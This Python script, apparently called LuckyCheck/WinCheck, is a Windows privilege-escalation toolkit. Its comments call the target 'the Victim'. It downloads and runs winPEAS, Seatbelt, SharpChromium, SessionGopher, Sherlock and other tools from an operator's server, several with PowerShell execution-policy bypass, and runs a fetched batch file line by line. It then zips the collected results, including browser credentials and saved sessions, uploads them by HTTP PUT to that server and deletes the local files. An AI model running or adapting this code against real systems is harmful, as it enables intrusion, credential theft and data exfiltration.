import os
from argparse import ArgumentParser
from sys import argv
from subprocess import Popen, STDOUT, PIPE
from platform import system, machine, release, node, platform, architecture, processor
from shutil import disk_usage, rmtree
from time import time, sleep, strftime, gmtime
from zipfile import ZipFile
from glob import glob
from requests import get, put
from ctypes import windll
from socket import gethostname, gethostbyname


def login():
    print("""
      _,.
           ,''   `.     __....__ 
         ,'        >.-''        ``-.__,)
       ,'      _,''           _____ _,'
      /      ,'           _.:':::_`:-._ 
     :     ,'       _..-''  \`'.;.`-:::`:. 
     ;    /       ,'  ,::'  .\,'`.`. `\::)`  
    /    /      ,'        \   `. '  )  )/ 
   /    /      /:`.     `--`'   \     '`
   `-._/      /::::)             )
      /      /,-.:(   , _   `.-' 
     ;      :(,`.`-' ',`.     ;
    :       |:\`' )      `-.._\ _
    |         `:-(             `)``-._ 
    |           `.`.        /``'      ``:-.-__,
    :           / `:\ .     :            ` \`-
     \        ,'   '}  `.   |
  _..-`.    ,'`-.   }   |`-'    
,'__    `-'' -.`.'._|   | 
    ```--..,.__.(_|.|   |::._
      __..','/ ,' :  `-.|::)_`.
      `..__..-'   |`.      __,' 
                  :  `-._ `  ;
                   \ \   )  /
                   .\ `.   /
                    ::    /
                    :|  ,'
                    :;,' 
                    `'
    LuckyCheck by BlackSnufkin:                                                           
    Thanks to all Other tools that made it happened                                       
    Modular Privesc ToolBox                                                               
    Add or Remove Tools as you want just with 4 lines and 6 lines for make it look good ;)
    """)


parser = ArgumentParser(description='Example: WinCheck.exe -i 127.0.0.1 -b (Basic Scan) ')
parser.add_argument('-i', '--server', type=str, metavar='', required=True, help='The Privesc Server IP.')
group = parser.add_mutually_exclusive_group()
group.add_argument('-b', '--basic', action='store_true', help='Run Basic WinCheck Scan (3 Tools) . ')
group.add_argument('-a', '--advanced', action='store_true', help='Run advanced WinCheck Scan (7 Tools). ')
group.add_argument('-f', '--full', action='store_true', help='Run Full WinCheck Scan (14 Tools). ')
args = parser.parse_args()

SERVER_IP = args.server


def work_space(directory, mode):
    # Create The work Space of the program
    wincheck_folder = os.getcwd() + '\{}-{}\\'.format(directory, mode)
    os.mkdir(wincheck_folder)
    os.chdir(wincheck_folder)


def WinCheck(cmd, url, output_file, input_file):
    # Download & run the tools
    # write the output to file
    # Remove the tool form the Victim
    req = get(url)
    if req.status_code == 200:
        file = open(input_file, 'wb')
        file.write(req.content)
        file.close()
    else:
        print("[!] The Privesc Server is Unavailable..\n[-] Bye Bye ... ")
        exit()

    time.sleep(1)
    run_tool = Popen(cmd, shell=True, stdout=PIPE, stderr=STDOUT).stdout.read()
    time.sleep(0.5)
    try:
        print(run_tool.decode(encoding='utf-8', errors='ignore'))
    except Exception as error:
        print(error)
    report = open(output_file, 'w')
    report.write('\n[$*] Starting {} Report '.format(output_file))
    report.write(run_tool.decode(encoding='utf-8', errors='ignore'))
    report.write('\n[$!]Done {} Report '.format(output_file))
    report.close()
    os.remove(input_file)


def WinCheck_bat_file(url, output_file, input_file):
    # Download the bat file
    # Read form the bat file and read line by line and execute
    # Output the result to file and remove the bat file
    file = open(input_file, 'a')
    req = get(url)
    command = req.text.splitlines()
    if req.status_code == 200:
        for line in command:
            file.write(line + os.linesep)
    else:
        req.close()
        exit()
    file.close()
    sleep(1)
    new_file = open(input_file, 'r')
    report = open(output_file, 'w')
    report.write('[$*] Starting {} Report '.format(output_file))
    for line in new_file:
        bat_file = Popen(line, shell=True, stdout=PIPE, stderr=STDOUT).stdout.read()
        print(bat_file.decode(encoding='utf-8', errors='ignore'))
        report.write(bat_file.decode(encoding='utf-8', errors='ignore'))
    report.write('[$!] Done {} Report '.format(output_file))
    new_file.close()
    report.close()
    os.remove(input_file)


def edit_and_send(directory, mode):
    # Merge all the output files to one big report
    # Sort the the final report and remove duplicate (Some duplicate lines because the output of the original tool)
    # Zip the folder with all the reports and send it to the Privesc Server with PUT method and cleans al the files
    read_files = glob("*.txt")
    base_name = directory + '-' + mode
    with open("result.txt", "wb") as outfile:
        for f in read_files:
            with open(f, "rb") as infile:
                outfile.write(infile.read())

    lines_seen = set()
    with open("{}-{}-report.txt".format(directory, mode), "w") as output_file:
        for each_line in open("result.txt", "r"):
            if each_line not in lines_seen:
                output_file.write(each_line)
                lines_seen.add(each_line)
    outfile.close()
    output_file.close()
    os.remove('result.txt')
    file_paths = []
    os.chdir('..')
    for root, directories, files in os.walk(base_name):
        for filename in files:
            filepath = os.path.join(root, filename)
            file_paths.append(filepath)

    print('Following files will be zipped:')
    for file_name in file_paths:
        print(file_name)
        sleep(0.5)

    with ZipFile(base_name + '.zip', 'w') as zip:
        for file in file_paths:
            zip.write(file)
            sleep(0.5)
    print('[+] All files zipped successfully!')

    headers = {'Content-Type': 'text/plain'}
    url = 'http://' + SERVER_IP + ':8200/{}.zip'.format(base_name)
    file = {'file': ('FinelReport', open(base_name + '.zip', 'rb'), 'application/octet-stream')}
    put(url, headers=headers, files=file, verify=False)
    zip.close()
    file['file'] = 'FinelReport', open(base_name + '.zip', 'rb').close(), 'application/octet-stream'

    os.remove(base_name + ".zip")
    rmtree(base_name)


def sysinfo():
    total, used, free = disk_usage("/")

    user32 = windll.user32
    screensize = (user32.GetSystemMetrics(0)), (user32.GetSystemMetrics(1))
    cpu = str(os.popen("wmic cpu get name").read())
    cpu_name = cpu.rsplit()[1::1]
    cpu2 = str(cpu_name).strip("[]").replace(",", " ").replace("'", " ")
    boot_time = str(os.popen('systeminfo | find "System Boot Time"').read())
    ip = gethostbyname("%s.local" % gethostname())

    print("\t[*] CPU Type: " + processor())
    print("\t[*] CPU Name: " + cpu2)
    print("\t[*] OS: " + system())
    print("\t[*] Machine: " + machine())
    print("\t[*] OS Release: " + release())
    print("\t[*] Host name: " + node())
    print("\t[*] Machine Platform: " + platform())
    print("\t[*] Architect: " + architecture()[0])
    print("\t[*] Login Name :" + os.getlogin())
    print("\t[*] Local IP: " + ip)
    print("\t[*] Resolution: " + str(screensize).replace(",", " X"))
    print("\t[*] " + boot_time.strip('\n'))
    print("\t[*] Hard drive: " + "Total: %d GB " % (total // (2 ** 30)) + "\tUsed: %d GB "
          % (used // (2 ** 30))
          + "\tFree: %d GB" % (free // (2 ** 30)))


'''
All The Tools in This Script
'''


def winPEAS(base_url):
    # winPEAS
    # Github: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
    # Author: carlospolop

    winPAES = "winPEAS.exe"
    winPEAS_url = base_url + "winPEAS.exe cmd"
    print('\n[+] Running winPEAS Scan ')
    WinCheck(cmd=winPAES, url=winPEAS_url, output_file="winPEAS.txt", input_file="winPEAS.exe")
    print('[$] Done winPEAS Scan')


def Seatbelt(base_url):
    # Seatbelt
    # Github: https://github.com/Lexus89/SharpPack/tree/master/Seatbelt
    # Author: Lexus89

    Seatbealt = 'Seatbelt.exe -group=all -full'
    Seatbealt_url = base_url + 'Seatbelt.exe'
    print('\n[+] Starting Seatbelt Scan ')
    WinCheck(cmd=Seatbealt, url=Seatbealt_url, output_file="Seatbelt.txt", input_file='Seatbelt.exe')
    print('[$] Done Seatbelt Scan ')


def JAWS(base_url):
    # J.A.W.S
    # Github: https://github.com/411Hall/JAWS
    # Author: 411Hall

    jaws = "powershell.exe  -ExecutionPolicy Bypass -file jaws-enum.ps1"
    jaws_url = base_url + 'jaws-enum.ps1'
    print('\n[+] Running J.A.W.S Scan ')
    WinCheck(cmd=jaws, url=jaws_url, output_file='JAWS.txt', input_file='jaws-enum.ps1')
    print('[$] Done J.A.W.S Scan ')


def Powerless(base_url):
    # Powerless
    # Github: https://github.com/M4ximuss/Powerless
    # Author: M4ximuss

    Powerless_url = base_url + 'Powerless.bat'
    print('\n[+] Running Powerless Scan ')
    WinCheck_bat_file(url=Powerless_url, output_file='Powerless.txt', input_file='Powerless.bat')
    print('[$] Done Powerless Scan ')


def winEnum_wmic(base_url):
    # winEnum_wmic
    # Author: greyshell
    # Github: Unknow

    winEnum_wmic_url = base_url + 'winEnum_wmic_v2.0.bat'
    print('\n[+] Running winEnum_wmic Scan ')
    WinCheck_bat_file(url=winEnum_wmic_url, output_file='winEnum_wmic.txt', input_file='winEnum_wmic.bat')
    print('[$] Done winEnum_wmic Scan ')


def winPE(base_url):
    # winPE
    # Github: https://github.com/carlospolop/winPE
    # Author: carlospolop

    winPE_url = base_url + 'winPE.bat'
    print('\n[+] Running winPE Scan ')
    WinCheck_bat_file(url=winPE_url, output_file='winPE.txt', input_file='winPE.bat')
    print('[+] Done winPE Scan ')


def InvokePrivescCheck(base_url):
    # Invoke-PrivescCheck
    # Github: https://github.com/itm4n/PrivescCheck
    # Author: itm4n
    PrivescCheck_url = base_url + 'PrivescCheck.ps1'
    PrivescCheck = 'powershell -ep bypass Import-Module .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended'
    print('\n[+] Running Invoke-PrivescCheck Scan ')
    WinCheck(cmd=PrivescCheck, url=PrivescCheck_url, output_file='Invoke-PrivescCheck.txt',
             input_file='PrivescCheck.ps1')
    print('[$] Done Invoke-PrivescCheck Scan ')


def SharpChromium(base_url):
    # SharpChromium
    # Github: https://github.com/djhohnstein/SharpChromium
    # Author: djhohnstein

    SharpChromium_url = base_url + 'SharpChromium.exe'
    SharpChromium = 'SharpChromium.exe full'
    print('\n[+] Running SharpChromium Scan ')
    WinCheck(cmd=SharpChromium, url=SharpChromium_url, output_file='SharpChromium.txt',
             input_file='SharpChromium.exe')
    print('[$] Done SharpChromium Scan ')


def Watson(base_url):
    # Watson
    # Github: https://github.com/rasta-mouse/Watson
    # Author: rasta-mouse

    Watson_url = base_url + 'Watson.exe'
    Watson = 'Watson.exe'
    print('\n[+] Running Watson Scan ')
    WinCheck(cmd=Watson, url=Watson_url, output_file='Watson.txt', input_file='Watson.exe')
    print('[$] Done Watson Scan ')


def SessionGopher(base_url):
    # SessionGopher
    # Github: https://github.com/Arvanaghi/SessionGopher
    # Author: Arvanaghi

    SessionGopher_url = base_url + 'SessionGopher.ps1'
    SessionGopher = 'powershell -ep bypass Import-Module .\SessionGopher.ps1; Invoke-SessionGopher -Thorough'
    print('\n[+] Running SessionGopher Scan ')
    WinCheck(cmd=SessionGopher, url=SessionGopher_url, output_file='SessionGopher.txt',
             input_file='SessionGopher.ps1')
    print('[$] Done SessionGopher Scan ')


def Sherlock(base_url):
    # Sherlock
    # Github: https://github.com/rasta-mouse/Sherlock
    # Author: rasta-mouse

    Sherlock_url = base_url + 'Sherlock.ps1'
    Sherlock = 'powershell -ep bypass Import-Module .\Sherlock.ps1; Find-AllVulns'
    print('\n[+] Running Sherlock Scan ')
    WinCheck(cmd=Sherlock, url=Sherlock_url, output_file='Sherlock.txt', input_file='Sherlock.ps1')
    print('[$] Done Sherlock Scan ')


def Check_Service(base_url):
    # Check-Service-Paths
    # Github: https://github.com/BleepSec/Check-Service-Paths
    # Author: BleepSec

    Check_Service_url = base_url + 'Check-Service-Paths.ps1'
    Check_Service = 'powershell -ep bypass .\Check-Service-Paths.ps1'
    print('\n[+] Running Check-Service-Paths Scan ')
    WinCheck(cmd=Check_Service, url=Check_Service_url, output_file='Check-Service-Paths.txt',
             input_file='Check-Service-Paths.ps1')
    print('[$] Done Check-Service-Paths Scan ')


def SharpUp(base_url):
    # SharpUp
    # Github: https://github.com/GhostPack/SharpUp
    # Author: harmj0y

    SharpUp_url = base_url + 'SharpUp.exe'
    SharpUp = 'SharpUp.exe'
    print('\n[+] Running SharpUp Scan ')
    WinCheck(cmd=SharpUp, url=SharpUp_url, output_file='SharpUp.txt', input_file='SharpUp.exe')
    print('[$] Done SharpUp Scan ')


def privesc(base_url):
    # privesc
    # Github: https://github.com/enjoiz/Privesc
    # Author: enjoiz

    privesc_url = base_url + 'privesc.ps1'
    privesc = 'powershell -ep bypass Import-Module .\privesc.ps1; invoke-privesc'
    print('\n[+] Running privesc Scan ')
    WinCheck(cmd=privesc, url=privesc_url, output_file='privesc.txt', input_file='privesc.ps1')
    print('[$] Done privesc Scan ')


def user_choice(mode):
    user_accept = input('[?] Are you want to Continue ? (Y/n) '.lower())
    while user_accept != 'n' and user_accept != 'y':
        print('[!] Not Valid Option Select (Y or N) ')
        user_accept = input('\n[?] Are you want to Continue ? (Y/n) '.lower())
    if user_accept == 'n':
        print('[!] Deleting All files..')
        os.chdir('..')
        rmtree(os.environ['COMPUTERNAME'] + '-{}'.format(mode))
        print('[!] Bye Bye...')
        sys.exit()
    else:
        pass


def main():
    base_url = "http://" + SERVER_IP + ":8200/Privesc_Tools/WinCheck/"

    if len(argv) < 4:
        print("[?] What Type of WinCheck Scan would you like to run? ")
        print(parser.format_help())

    if args.basic:
        login()
        print('[*] Basic Host Information:')
        sysinfo()
        sleep(1)
        work_space(directory=os.environ['COMPUTERNAME'], mode='Basic')
        print(
            '\n[!] WinCheck Settings: \n\t[*] Server IP: {}\n\t[*] Mode: Full \n\t[*] Work Space: {} \n\t[*] Estimated Run time: ** 18-13 Minutes ** \n'.format(
                SERVER_IP, os.getcwd()))
        user_choice(mode='Basic')

        start_time = time()
        print('[*] Running Basic WinCheck scan')
        winPEAS(base_url)
        Seatbelt(base_url)
        JAWS(base_url)
        edit_and_send(directory=os.environ['COMPUTERNAME'], mode='Basic')
        seconds = time() - start_time
        print('[$] Done Basic WinCheck scan in: ', strftime("%H:%M:%S", gmtime(seconds)))

    elif args.advanced:
        login()
        print('[*] Basic Host Information:')
        sysinfo()
        sleep(1)
        work_space(directory=os.environ['COMPUTERNAME'], mode='Advanced')
        print(
            '\n[!] WinCheck Settings: \n\t[*] Server IP: {}\n\t[*] Mode: Full \n\t[*] Work Space: {} \n\t[*] Estimated Run time: ** 18-13 Minutes ** \n'.format(
                SERVER_IP, os.getcwd()))
        user_choice(mode='Advanced')
        start_time = time()
        print('[+] Running advanced WinCheck scan')
        winPEAS(base_url)
        Seatbelt(base_url)
        JAWS(base_url)
        Sherlock(base_url)
        Watson(base_url)
        SessionGopher(base_url)
        SharpUp(base_url)
        edit_and_send(directory=os.environ['COMPUTERNAME'], mode='Advanced')
        seconds = time() - start_time
        print('[$] Done Advanced WinCheck scan in: ', strftime("%H:%M:%S", gmtime(seconds)))

    elif args.full:
        login()
        print('[*] Basic Host Information:')
        sysinfo()
        sleep(1)
        work_space(directory=os.environ['COMPUTERNAME'], mode='Full')
        print(
            '\n[!] WinCheck Settings: \n\t[*] Server IP: {}\n\t[*] Mode: Full \n\t[*] Work Space: {} \n\t[*] Estimated Run time: ** 18-13 Minutes ** \n'.format(
                SERVER_IP, os.getcwd()))
        user_choice(mode='Full')
        start_time = time()
        print('[+] Running Full WinCheck scan')

        # accesschk
        accesschk_url = base_url + 'accesschk.exe'
        req = get(accesschk_url).content
        accesschk = open('accesschk.exe', 'wb')
        accesschk.write(req)
        accesschk.close()
        Powerless(base_url)
        winEnum_wmic(base_url)
        winPE(base_url)
        InvokePrivescCheck(base_url)
        SharpChromium(base_url)
        Watson(base_url)
        winPEAS(base_url)
        Seatbelt(base_url)
        JAWS(base_url)
        SessionGopher(base_url)
        Sherlock(base_url)
        Check_Service(base_url)
        SharpUp(base_url)
        privesc(base_url)
        os.remove("accesschk.exe")
        edit_and_send(directory=os.environ['COMPUTERNAME'], mode='Full')
        seconds = time() - start_time
        print('[$] Done Full WinCheck scan in: ', strftime("%H:%M:%S", gmtime(seconds)))


if __name__ == '__main__':
    main()
